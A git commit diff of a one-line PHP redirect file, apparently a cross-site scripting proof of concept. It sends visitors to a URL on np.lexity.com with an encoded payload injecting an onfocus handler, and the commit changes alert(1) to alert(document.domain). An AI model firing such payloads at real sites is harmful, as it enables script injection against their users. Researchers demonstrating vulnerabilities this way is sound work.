4e5228358bec1f86049366e805e72fd8858e5b0d
missoum1307 <missoum1307@users.noreply.github.com>
2017-12-08 22:28:49 +0100

    Update redir1.php

--- redir1.php
+++ redir1.php
@@ -1,1 +1,1 @@
-<?php header('location: https://np.lexity.com/f57ea75d/h/1/v/q/k/aaa/u/xxxx/r/fff/vn/1/c/%3Cx~%0Aonfocus=alert(1)%20id=a%20tabindex=0%3E%3C--') ?> 
+<?php header('location: https://np.lexity.com/f57ea75d/h/1/v/q/k/aaa/u/xxxx/r/fff/vn/1/c/%3Cx~%0Aonfocus=alert(document.domain)%20id=a%20tabindex=0%3E%3C--') ?> 
